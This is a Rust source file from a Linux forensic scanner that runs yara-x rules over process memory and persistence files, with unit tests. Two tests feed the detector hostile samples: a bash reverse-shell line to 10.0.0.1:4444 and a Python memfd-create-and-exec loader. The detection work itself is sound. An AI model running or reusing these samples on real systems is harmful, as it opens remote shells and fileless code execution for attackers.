//! YARA scanning (yara-x) of suspicious memory regions and persistence targets.

use std::sync::OnceLock;
use std::time::Duration;

use rayon::prelude::*;

use super::mem::{open_mem, read_at};
use super::read_bytes;
use crate::core::report::{Category, Finding};
use crate::rules::{self, EMBEDDED};

pub enum Target {
    Mem {
        pid: u32,
        name: String,
        addr: u64,
        len: u64,
        label: String,
    },
    File {
        path: String,
        label: String,
    },
}

pub struct Engine {
    /// The vetted rule set, compiled at build time.
    rules: yara_x::Rules,
    /// Rule files given with --rules / --rules-dir, compiled at run time.
    user: Option<yara_x::Rules>,
    pub loaded: usize,
    pub skipped: Vec<String>,
}

static COMPILED: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/rules.bin"));

/// Load the precompiled rule set and compile any extra rule files.
pub fn engine(extra: &[String]) -> &'static Result<Engine, String> {
    static E: OnceLock<Result<Engine, String>> = OnceLock::new();
    E.get_or_init(|| {
        let rules = yara_x::Rules::deserialize(COMPILED)
            .map_err(|e| format!("embedded rule set unreadable: {e}"))?;
        let mut loaded = EMBEDDED.len();
        let mut skipped = Vec::new();
        let mut user = None;
        if !extra.is_empty() {
            let mut c = yara_x::Compiler::new();
            let mut n = 0;
            for path in extra {
                let Some(b) = read_bytes(path, 64 << 20) else {
                    skipped.push(format!("{path}: unreadable"));
                    continue;
                };
                c.new_namespace(&format!("user/{}", crate::core::paths::file_name(path)));
                match c.add_source(String::from_utf8_lossy(&b).as_ref()) {
                    Ok(_) => n += 1,
                    Err(e) => skipped.push(format!(
                        "{path}: {}",
                        e.to_string().lines().next().unwrap_or("")
                    )),
                }
            }
            if n > 0 {
                loaded += n;
                user = Some(c.build());
            }
        }
        Ok(Engine {
            rules,
            user,
            loaded,
            skipped,
        })
    })
}

/// `.yar`/`.yara` files under a directory (recursive, symlinks not followed), sorted.
pub fn rule_files_in(dir: &str) -> Vec<String> {
    use crate::linux::walk::{par_walk, Walk};
    let visit = |p: &str, _: &std::fs::Metadata| {
        (p.ends_with(".yar") || p.ends_with(".yara")).then(|| p.to_string())
    };
    let (mut v, _) = par_walk(
        &[dir.to_string()],
        &Walk {
            max_depth: 16,
            limit: 100_000,
            skip_dir: &|_, n| n.starts_with('.'),
            visit: &visit,
        },
    );
    v.sort();
    v
}

fn meta_str(r: &yara_x::Rule, keys: &[&str]) -> Option<String> {
    r.metadata().find_map(|(k, v)| match v {
        yara_x::MetaValue::String(s) if keys.contains(&k) => Some(s.to_string()),
        _ => None,
    })
}

fn meta_int(r: &yara_x::Rule, keys: &[&str]) -> Option<i64> {
    r.metadata().find_map(|(k, v)| match v {
        yara_x::MetaValue::Integer(i) if keys.contains(&k) => Some(i),
        yara_x::MetaValue::String(s) if keys.contains(&k) => s.parse().ok(),
        _ => None,
    })
}

fn hit_finding(r: &yara_x::Rule, mem: bool) -> Finding {
    let ns = r.namespace();
    let source = ns.split('/').next().unwrap_or(ns);
    let sev = rules::severity_for(
        source,
        meta_int(r, &["score", "severity"]),
        meta_str(r, &["severity"]).as_deref(),
        mem,
    );
    let mut f = Finding::new(
        sev,
        Category::Yara,
        format!("YARA match: {}", r.identifier()),
    )
    .detail(format!("rule file: {ns}"));
    if let Some(d) = meta_str(r, &["description"]) {
        f = f.detail(format!("description: {d}"));
    }
    if let Some(a) = meta_str(r, &["author"]) {
        f = f.detail(format!("rule author: {a}"));
    }
    if let Some(rf) = meta_str(r, &["reference", "reference_sample"]) {
        f = f.detail(format!("reference: {rf}"));
    }
    f = f.detail(format!("rule license: {}", rules::license(source)));
    // ATT&CK IDs from the rule's own metadata (Exhume rules carry them); interned once per ID.
    if let Some(m) = meta_str(r, &["mitre", "mitre_attack", "technique"]) {
        for id in m
            .split([',', ' '])
            .map(str::trim)
            .filter(|t| t.starts_with('T') && t.len() >= 5 && t.len() <= 9)
        {
            f = f.mitre(&[intern(id)]);
        }
    }
    f
}

fn intern(id: &str) -> &'static str {
    use std::collections::HashSet;
    use std::sync::Mutex;
    static IDS: OnceLock<Mutex<HashSet<&'static str>>> = OnceLock::new();
    let mut set = IDS.get_or_init(Default::default).lock().unwrap();
    if let Some(s) = set.get(id) {
        return s;
    }
    let s: &'static str = Box::leak(id.to_string().into_boxed_str());
    set.insert(s);
    s
}

/// Size limits and per-scan timeout.
pub struct ScanOpts {
    pub max_file: usize,
    pub max_region: usize,
    pub timeout: Duration,
}

impl Target {
    /// Bytes this target will make YARA read (for largest-first scheduling).
    pub fn cost(&self, o: &ScanOpts) -> u64 {
        match self {
            Target::Mem { len, .. } => (*len).min(o.max_region as u64),
            Target::File { path, .. } => std::fs::metadata(path)
                .map(|m| m.len().min(o.max_file as u64))
                .unwrap_or(0),
        }
    }
}

pub fn scan(eng: &Engine, mut targets: Vec<Target>, o: &ScanOpts) -> Vec<Finding> {
    crate::core::resources::largest_first(&mut targets, |t| t.cost(o));
    targets
        .into_par_iter()
        // One small task per target keeps big and small items interleaved across threads.
        .with_max_len(1)
        .map_init(
            || {
                let mut s = yara_x::Scanner::new(&eng.rules);
                s.set_timeout(o.timeout);
                let u = eng.user.as_ref().map(|r| {
                    let mut u = yara_x::Scanner::new(r);
                    u.set_timeout(o.timeout);
                    u
                });
                (s, u)
            },
            |(scanner, user), t| {
                if !super::governor::checkpoint() {
                    return Vec::new();
                }
                let (data, mem) = match &t {
                    Target::Mem { pid, addr, len, .. } => {
                        let Some(f) = open_mem(*pid) else {
                            return Vec::new();
                        };
                        (read_at(&f, *addr, (*len as usize).min(o.max_region)), true)
                    }
                    Target::File { path, .. } => {
                        (read_bytes(path, o.max_file).unwrap_or_default(), false)
                    }
                };
                if data.is_empty() {
                    return Vec::new();
                }
                let mut hits = Vec::new();
                if let Ok(res) = scanner.scan(&data) {
                    hits.extend(
                        res.matching_rules()
                            .filter(|r| !rules::is_disabled(r.namespace(), r.identifier()))
                            .map(|r| hit_finding(&r, mem)),
                    );
                }
                if let Some(u) = user.as_mut() {
                    if let Ok(res) = u.scan(&data) {
                        hits.extend(res.matching_rules().map(|r| hit_finding(&r, mem)));
                    }
                }
                hits.into_iter()
                    .map(|mut f| {
                        match &t {
                            Target::Mem {
                                pid,
                                name,
                                addr,
                                label,
                                ..
                            } => {
                                f = f
                                    .proc(*pid, name)
                                    .addr(*addr)
                                    .detail(format!("scanned: {label}"));
                            }
                            Target::File { path, label } => {
                                f = f.path(path.clone()).detail(format!("scanned: {label}"));
                            }
                        }
                        f
                    })
                    .collect()
            },
        )
        .flatten()
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The rule set compiled by build.rs loads and holds every embedded rule file.
    #[test]
    fn precompiled_rules_load() {
        let Ok(e) = engine(&[]) else { panic!() };
        assert!(e.skipped.is_empty(), "{:?}", e.skipped);
        assert!(EMBEDDED.len() > 300);
        assert!(
            e.rules.iter().count() > 1000,
            "{} rules",
            e.rules.iter().count()
        );
        let namespaces: std::collections::HashSet<&str> =
            e.rules.iter().map(|r| r.namespace()).collect();
        for (src, file) in EMBEDDED {
            assert!(
                namespaces.contains(format!("{src}/{file}").as_str()) || file.contains("private"),
                "{src}/{file} has no rules"
            );
        }
    }

    #[test]
    fn custom_rule_matches() {
        let Ok(e) = engine(&[]) else { panic!() };
        assert!(e.skipped.is_empty(), "{:?}", e.skipped);
        let mut s = yara_x::Scanner::new(&e.rules);
        let data = b"#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n";
        let r = s.scan(data).unwrap();
        assert!(r
            .matching_rules()
            .any(|r| r.identifier().starts_with("Exhume_")));
    }

    #[test]
    fn memfd_loader_rules_need_real_imports() {
        let Ok(e) = engine(&[]) else { panic!() };
        let mut s = yara_x::Scanner::new(&e.rules);
        let mut hit = |d: &[u8]| {
            s.scan(d)
                .unwrap()
                .matching_rules()
                .any(|r| r.identifier() == "Exhume_Fileless_Memfd_Loader")
        };
        // Strings alone (libc symbol names, syscall tables) no longer match: the rule needs real
        // imports, which the false-positive gate checks against libc, strace and valgrind.
        let strings_only =
            b"\x7fELF\x02\x01\x01\0........memfd_create\0fexecve\0connect\0".to_vec();
        assert!(!hit(&strings_only));
        let script = b"#!/usr/bin/python3\nimport os\nfd = os.memfd_create('x')\nos.execv('/proc/self/fd/%d' % fd, ['x'])\n";
        let mut s2 = yara_x::Scanner::new(&e.rules);
        assert!(s2
            .scan(script)
            .unwrap()
            .matching_rules()
            .any(|r| r.identifier() == "Exhume_Script_Memfd_Loader"));
        // google-auth keeps TLS keys in a memfd and passes /proc/self/fd/N to OpenSSL: no exec.
        let tls = b"import os\nfd = os.memfd_create(name, os.MFD_CLOEXEC)\nos.write(fd, key)\npaths.append(f\"/proc/self/fd/{fd}\")\n";
        assert!(!s2
            .scan(tls)
            .unwrap()
            .matching_rules()
            .any(|r| r.identifier() == "Exhume_Script_Memfd_Loader"));
    }

    /// False-positive gate: no enabled rule may match clean system binaries, libraries and
    /// scripts. Run on a clean host (CI runner): `cargo test --release -- --ignored false_positive`.
    #[test]
    #[ignore]
    fn false_positive_clean_system_files() {
        use crate::linux::walk::{par_walk, Walk};
        let Ok(e) = engine(&[]) else { panic!() };
        let roots: Vec<String> = ["/usr/bin", "/usr/sbin", "/usr/lib", "/usr/libexec", "/etc"]
            .iter()
            .filter(|r| std::path::Path::new(r).exists())
            .map(|r| r.to_string())
            .collect();
        let skip = |_: &str, n: &str| n == "python3" && false;
        let visit = |p: &str, m: &std::fs::Metadata| {
            (m.len() > 0 && m.len() <= 64 << 20).then(|| p.to_string())
        };
        let (files, _) = par_walk(
            &roots,
            &Walk {
                max_depth: 12,
                limit: 200_000,
                skip_dir: &skip,
                visit: &visit,
            },
        );
        let hits: Vec<String> = files
            .par_iter()
            .map_init(
                || yara_x::Scanner::new(&e.rules),
                |s, p| {
                    let Some(data) = read_bytes(p, 64 << 20) else {
                        return Vec::new();
                    };
                    let Ok(r) = s.scan(&data) else {
                        return Vec::new();
                    };
                    r.matching_rules()
                        .filter(|r| !rules::is_disabled(r.namespace(), r.identifier()))
                        .map(|r| format!("{} {}  -> {p}", r.namespace(), r.identifier()))
                        .collect()
                },
            )
            .flatten()
            .collect();
        eprintln!("scanned {} files", files.len());
        assert!(
            hits.is_empty(),
            "{} false positives:\n{}",
            hits.len(),
            hits.join("\n")
        );
    }

    /// Ad-hoc check of the embedded rules against one file: EXHUME_SCAN_FILE=/path cargo test -- --ignored scan_one_file
    #[test]
    #[ignore]
    fn scan_one_file() {
        let Ok(path) = std::env::var("EXHUME_SCAN_FILE") else {
            return;
        };
        let Ok(e) = engine(&[]) else { panic!() };
        let mut s = yara_x::Scanner::new(&e.rules);
        let data = std::fs::read(&path).unwrap();
        for r in s.scan(&data).unwrap().matching_rules() {
            println!("MATCH {} {}", r.namespace(), r.identifier());
        }
    }
}
